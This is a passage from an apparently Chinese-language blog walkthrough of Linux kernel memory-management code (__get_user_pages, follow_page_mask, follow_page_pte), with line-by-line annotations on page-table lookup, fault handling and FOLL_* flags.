class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * __get_user_pages() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:task_struct of target task</span><br><span class="hljs-comment"> * @mm:mm_struct of target mm</span><br><span class="hljs-comment"> * @start:starting user address</span><br><span class="hljs-comment"> * @nr_pages:number of pages from start to pin</span><br><span class="hljs-comment"> * @gup_flags:flags modifying pin behaviour</span><br><span class="hljs-comment"> * @pages:array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> * @nonblocking: whether waiting for disk IO or mmap_sem contention</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held.  It may be released.  See below.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * __get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * __get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @gup_flags &amp; FOLL_WRITE == 0, the page must not be written to. If</span><br><span class="hljs-comment"> * the page is written to, set_page_dirty (or set_page_dirty_lock, as</span><br><span class="hljs-comment"> * appropriate) must be called after the page is finished with, and</span><br><span class="hljs-comment"> * before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @nonblocking != NULL, __get_user_pages will not wait for disk IO</span><br><span class="hljs-comment"> * or mmap_sem contention, and if waiting is needed to pin all pages,</span><br><span class="hljs-comment"> * *@nonblocking will be set to 0.  Further, if @gup_flags does not</span><br><span class="hljs-comment"> * include FOLL_NOWAIT, the mmap_sem will be released via up_read() in</span><br><span class="hljs-comment"> * this case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A caller using such a combination of @nonblocking and @gup_flags</span><br><span class="hljs-comment"> * must therefore hold the mmap_sem for reading only, and recognize</span><br><span class="hljs-comment"> * when it&#x27;s been released.  Otherwise, it must be held for either</span><br><span class="hljs-comment"> * reading or writing and will not be released.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In most cases, get_user_pages or get_user_pages_fast should be used</span><br><span class="hljs-comment"> * instead of __get_user_pages. __get_user_pages should be used only if</span><br><span class="hljs-comment"> * you need some special @gup_flags.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__get_user_pages()-把用户页面固定在内存中</span><br><span class="hljs-comment">@tsk：目标进程</span><br><span class="hljs-comment">@mm：目标内存空间</span><br><span class="hljs-comment">@start：起始用户地址</span><br><span class="hljs-comment">@nr_pages：锁定多少页面</span><br><span class="hljs-comment">@gup_flags：控制get user pages的行为标志</span><br><span class="hljs-comment">@pages：接受被锁定页面指针的指针数组，最少要能保存nr_pages个指针</span><br><span class="hljs-comment">@vmas：一个VMA指针数组，用于存放每一个页面对应的VMA对象</span><br><span class="hljs-comment">@nonblocking：是否等待磁盘IO或者mmap_sem竞争</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> __get_user_pages(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gup_flags, <span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-keyword">struct</span> vm_area_struct **vmas, <span class="hljs-type">int</span> *nonblocking)<br>&#123;<br><span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_mask;<span class="hljs-comment">//根据页面大小设置掩码</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">——！！pages:等价于pages!=0，表示pages是否为一个非空指针</span><br><span class="hljs-comment">——！！(gup_flags &amp; FOLL_GET):等价于gup_flags &amp; FOLL_GET！=0，标志是否设置FOLL_GET标志</span><br><span class="hljs-comment">——只要这两个条件不像等就会出bug</span><br><span class="hljs-comment">要么pages是个空指针，gup_flags没设置FOLL_GET标志，不需要获取页面</span><br><span class="hljs-comment">要么pages存在，gup_flags设置了FOLL_GET标志，需要获取页面*/</span><br>VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span><br><span class="hljs-comment"> * fault information is unrelated to the reference behaviour of a task</span><br><span class="hljs-comment"> * using the address space</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))<br>gup_flags |= FOLL_NUMA;<br>    <br><span class="hljs-comment">//通过一个do&#123;...&#125;while(nr_pages)循环, 遍历所有需要锁定的页, 处理一个页之前, 先找到所属的VMA</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> foll_flags = gup_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_increm;<br><br>        <span class="hljs-comment">//如果是第一次迭代，或者跨越了VMA的边界</span><br><span class="hljs-comment">/* first iteration or cross vma bound */</span><br><span class="hljs-keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;<br>vma = find_extend_vma(mm, start);<span class="hljs-comment">//寻找包含start的VMA对象</span><br><span class="hljs-keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;<span class="hljs-comment">//寻找出错</span><br><span class="hljs-type">int</span> ret;<br>ret = get_gate_page(mm, start &amp; PAGE_MASK,<br>gup_flags, &amp;vma,<br>pages ? &amp;pages[i] : <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> i ? : ret;<br>page_mask = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> next_page;<br>&#125;<br><span class="hljs-comment">//短路测试：如果vma不为NULL，那就会执行check_vma_flags(vma, gup_flags)检查下vma的权限是满足gup_flags的要求</span><br><span class="hljs-keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))<br><span class="hljs-keyword">return</span> i ? : -EFAULT;<br><span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<span class="hljs-comment">//对于大TLB的页面，调用follow_hugetlb_page()处理</span><br>i = follow_hugetlb_page(mm, vma, pages, vmas,<br>&amp;start, &amp;nr_pages, i,<br>gup_flags);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> * potentially allocating memory.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">/*__get_user_pages()最核心的部分, 就是下面这个循环, follow_page_mask()判断对应页是否满足foll_flags要求, faultin_page()负责处理错误, 会一直循环到对应页满足foll_flags的要求*/</span><br>        <span class="hljs-comment">//如果有待处理的SIGKILL，就直接结束</span><br><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br><span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>cond_resched();<span class="hljs-comment">//调度执行别的任务</span><br>        <span class="hljs-comment">//根据foll_flags的要求追踪vma中start对应的页，如果不能满足要求或者页不存在，就返回NULL</span><br>page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);<br><span class="hljs-keyword">if</span> (!page) &#123;<span class="hljs-comment">//缺页异常处理</span><br><span class="hljs-type">int</span> ret;<br>            <span class="hljs-comment">//faultin_page()会处理缺页异常，处理完毕后会返回0</span><br>ret = faultin_page(tsk, vma, start, &amp;foll_flags,<br>nonblocking);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-keyword">goto</span> retry;<span class="hljs-comment">//缺页异常处理完毕，再次尝试追踪页，看有无缺页异常发生</span><br><span class="hljs-keyword">case</span> -EFAULT:<span class="hljs-comment">//处理缺页异常时发送，处理终止</span><br><span class="hljs-keyword">case</span> -ENOMEM:<br><span class="hljs-keyword">case</span> -EHWPOISON:<br><span class="hljs-keyword">return</span> i ? i : ret;<br><span class="hljs-keyword">case</span> -EBUSY:<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">case</span> -ENOENT:<span class="hljs-comment">//异常处理完毕，只是没有对应的页描述符，处理下一页</span><br><span class="hljs-keyword">goto</span> next_page;<br>&#125;<br>BUG();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment"> * struct page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">goto</span> next_page;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br><span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>&#125;<br>        <span class="hljs-comment">//处理完这个页之后, 记录结果, 然后处理下一个页</span><br><span class="hljs-keyword">if</span> (pages) &#123;<span class="hljs-comment">//记录锁定的页</span><br>pages[i] = page;<br>flush_anon_page(vma, page, start);<br>flush_dcache_page(page);<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>next_page:<br><span class="hljs-keyword">if</span> (vmas) &#123;<span class="hljs-comment">//记录页对应的vma</span><br>vmas[i] = vma;<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br><span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>page_increm = nr_pages;<br>i += page_increm;<span class="hljs-comment">//处理了多少页</span><br>start += page_increm * PAGE_SIZE;<span class="hljs-comment">//下一个处理的地址</span><br>nr_pages -= page_increm;<span class="hljs-comment">//还剩多少页</span><br>&#125; <span class="hljs-keyword">while</span> (nr_pages);<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>EXPORT_SYMBOL(__get_user_pages);<br></code></pre></td></tr></table></figure><h4 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask()"></a>follow_page_mask()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * follow_page_mask - look up a page descriptor from a user-virtual address</span><br><span class="hljs-comment"> * @vma: vm_area_struct mapping @address</span><br><span class="hljs-comment"> * @address: virtual address to look up</span><br><span class="hljs-comment"> * @flags: flags modifying lookup behaviour</span><br><span class="hljs-comment"> * @page_mask: on output, *page_mask is set according to the size of the page</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags can have FOLL_ flags set, defined in &lt;linux/mm.h&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns the mapped (struct page *), %NULL if no mapping exists, or</span><br><span class="hljs-comment"> * an error pointer if there is a mapping to something not represented</span><br><span class="hljs-comment"> * by a page descriptor (see also vm_normal_page()).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  follow_page_mask -根据一个用户空间地址找一个页描述符</span><br><span class="hljs-comment">  @vma：映射@address的VMA对象</span><br><span class="hljs-comment">  @flags：控制查找行为的描述符</span><br><span class="hljs-comment">  @page_mask：*page_mask根据页面大小设置</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">  返回被映射的页，如果页不存在或者出错的话就返回NULL</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123;<br><span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//全局页目录</span><br><span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//页上级目录</span><br><span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">//页中级目录</span><br><span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">//自旋锁</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<span class="hljs-comment">//VMA所属的内存空间</span><br><br>*page_mask = <span class="hljs-number">0</span>;<span class="hljs-comment">//根据页面大小设置的掩码</span><br><br>page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE);<br><span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>BUG_ON(flags &amp; FOLL_GET);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    跟踪四级页目录:pgd=&gt;pud=&gt;pmd,</span><br><span class="hljs-comment">    如果对应表项为none, 则返回no_page_table()表示出错, 最后进入follow_page_pte()跟踪pte</span><br><span class="hljs-comment">    */</span><br><span class="hljs-comment">//在mm中根据address找对应的页全局目录</span><br>pgd = pgd_offset(mm, address);<br><span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>    <br><span class="hljs-comment">//在页全局目录中找对应的页上级目录</span><br>pud = pud_offset(pgd, address);<br><span class="hljs-keyword">if</span> (pud_none(*pud))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>page = follow_huge_pud(mm, address, pud, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-comment">//在页上级目录中找对应的页中级目录</span><br>pmd = pmd_offset(pud, address);<br><span class="hljs-keyword">if</span> (pmd_none(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>page = follow_huge_pmd(mm, address, pmd, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_devmap(*pmd)) &#123;<br>ptl = pmd_lock(mm, pmd);<br>page = follow_devmap_pmd(vma, address, pmd, flags);<br>spin_unlock(ptl);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><span class="hljs-keyword">if</span> (likely(!pmd_trans_huge(*pmd)))<span class="hljs-comment">//跟踪pte</span><br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br><br>ptl = pmd_lock(mm, pmd);<br><span class="hljs-keyword">if</span> (unlikely(!pmd_trans_huge(*pmd))) &#123;<br>spin_unlock(ptl);<br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>&#125;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br><span class="hljs-type">int</span> ret;<br>page = pmd_page(*pmd);<br><span class="hljs-keyword">if</span> (is_huge_zero_page(page)) &#123;<br>spin_unlock(ptl);<br>ret = <span class="hljs-number">0</span>;<br>split_huge_pmd(vma, pmd, address);<br><span class="hljs-keyword">if</span> (pmd_trans_unstable(pmd))<br>ret = -EBUSY;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>get_page(page);<br>spin_unlock(ptl);<br>lock_page(page);<br>ret = split_huge_page(page);<br>unlock_page(page);<br>put_page(page);<br><span class="hljs-keyword">if</span> (pmd_none(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><br><span class="hljs-keyword">return</span> ret ? ERR_PTR(ret) :<br>follow_page_pte(vma, address, pmd, flags);<br>&#125;<br><br>page = follow_trans_huge_pmd(vma, address, pmd, flags);<br>spin_unlock(ptl);<br>*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte()"></a>follow_page_pte()</h4><p>对于大多数普通页来说<code>follow_page_pte()</code>会检查页不存在和页不可写入两种缺页异常, 然后调用<code>vm_normal_page()</code>根据<code>pte</code>找到对应的页描述符<code>page</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//根据flags标志跟踪页面的pte</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev_pagemap</span> *<span class="hljs-title">pgmap</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br><span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<br>pte = *ptep;<br><span class="hljs-keyword">if</span> (!pte_present(pte)) &#123;<br><span class="hljs-type">swp_entry_t</span> entry;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment"> * even while it is being migrated, so for that case we</span><br><span class="hljs-comment"> * need migration_entry_wait().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> (pte_none(pte))<br><span class="hljs-keyword">goto</span> no_page;<br>entry = pte_to_swp_entry(pte);<br><span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br><span class="hljs-keyword">goto</span> no_page;<br>pte_unmap_unlock(ptep, ptl);<br>migration_entry_wait(mm, pmd, address);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//如果要求写入，但是pte表示不可写入</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>page = vm_normal_page(vma, address, pte);<span class="hljs-comment">//根据这个pte找到对应的普通页描述符</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    找到页描述符后, 会根据flags进行一些操作, 然后返回page, 在这里flags = 0x2017, 也就是如下标志</span><br><span class="hljs-comment">FOLL_WRITE 0x01 : 需要进行写入</span><br><span class="hljs-comment">FOLL_TOUCH 0x02 : 标记一下页面被访问过</span><br><span class="hljs-comment">FOLL_GET 0x04 : 获取页面的引用, 从而让页面锁定在内存中</span><br><span class="hljs-comment">FOLL_FORCE 0x10 : 强制写入只读内存区</span><br><span class="hljs-comment">FOLL_REMOTE 0x2000 : 要访问的不是当前任务的内存空间</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!page &amp;&amp; pte_devmap(pte) &amp;&amp; (flags &amp; 